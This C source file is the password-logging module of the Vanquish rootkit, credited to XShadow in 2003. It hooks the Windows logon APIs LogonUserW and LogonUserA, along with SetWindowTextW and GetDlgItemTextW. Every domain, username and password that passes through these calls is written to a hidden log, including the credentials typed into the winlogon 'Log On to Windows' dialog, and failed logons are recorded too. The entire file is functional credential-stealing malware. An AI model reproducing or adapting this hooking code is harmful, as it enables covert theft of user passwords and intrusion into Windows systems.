/******************************************************************************\

	Vanquish DLL PwdLog - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vPwdLog.h"
#include "..\Utils.h"

DECLARE_PWDLOG

DWORD dwWinlogon;

int WINLOGON_DetectW(LPCWSTR lpWindowName)
{
	unsigned long i;
	static LPCWSTR lpGINA_ID_W = L"Log On to Windows";
	const unsigned long dwMaxGINA = 17;

	if (!lpWindowName)
		return 0;

	if (IsBadReadPtr(lpWindowName, dwMaxGINA * sizeof(WCHAR)))
		return 0;

	for (i = 0; (lpWindowName[i] != 0) && (i < dwMaxGINA); i++)
		if (lpWindowName[i] != lpGINA_ID_W[i])
			return 0;

	return 10; //all ok we found it!
}

NEWAPI
BOOL
WINAPI
VLogonUserW(
    LPWSTR lpszUsername,
    LPWSTR lpszDomain,
    LPWSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    )
{
	BOOL retValue = FALSE;

	VBEGIN

	//do api thing
	RESTORE_API(LogonUserW);
	OLDCALL(LogonUserW, 6);
	REPLACE_API(LogonUserW);

	//if all went well we have a user and password
	if (retValue)
		Vanquish_Dump2Log("LOGIN OK! DOMAIN/USER/PASSW follow:");
	else
		Vanquish_Dump2Log("LOGIN FAILED! DOMAIN/USER/PASSW follow:");
	Vanquish_DumpW(lpszDomain);
	Vanquish_DumpW(lpszUsername);
	Vanquish_DumpW(lpszPassword);

	VEND
	return retValue;
}

NEWAPI
WINAPI
VLogonUserA(
    LPSTR lpszUsername,
    LPSTR lpszDomain,
    LPSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    )
{
	BOOL retValue = FALSE;

	VBEGIN

	//do api thing
	RESTORE_API(LogonUserA);
	OLDCALL(LogonUserA, 6);
	REPLACE_API(LogonUserA);

	//if all went well we have a user and password
	if (retValue)
		Vanquish_Dump2Log("LOGIN OK! DOMAIN/USER/PASSW follow:");
	else
		Vanquish_Dump2Log("LOGIN FAILED! DOMAIN/USER/PASSW follow:");
	Vanquish_Dump(lpszDomain);
	Vanquish_Dump(lpszUsername);
	Vanquish_Dump(lpszPassword);

	VEND
	return retValue;
}

NEWAPI
BOOL
WINAPI
VSetWindowTextW(
    HWND hWnd,
    LPCWSTR lpString
	)
{
	BOOL retValue = FALSE;

	VBEGIN

	//we could be in winlogon.exe
	if (WINLOGON_DetectW(lpString) != 0)
	{
		//remeber its process identificator
		dwWinlogon = GetCurrentProcessId();
	}

	RESTORE_API(SetWindowTextW);
	OLDCALL(SetWindowTextW, 2);
	REPLACE_API(SetWindowTextW);

	VEND

	return retValue;
}

NEWAPI
UINT
WINAPI
VGetDlgItemTextW(
    HWND hDlg,
    int nIDDlgItem,
    LPWSTR lpString,
    int nMaxCount)
{
	UINT retValue;

	VBEGIN

	RESTORE_API(GetDlgItemTextW);
	OLDCALL(GetDlgItemTextW, 4);
	REPLACE_API(GetDlgItemTextW);

	if (retValue)
	{
		DWORD dwThis = 0;
		dwThis = GetCurrentProcessId();

		//we are in winlogon
		if (dwThis == dwWinlogon)
		{
			//we could have stumbled upon a 'good' string
			Vanquish_Dump2Log("Winlogon interception (user, pwd or domain):");
			Vanquish_DumpW(lpString);
		}
	}

	VEND

	return retValue;
}
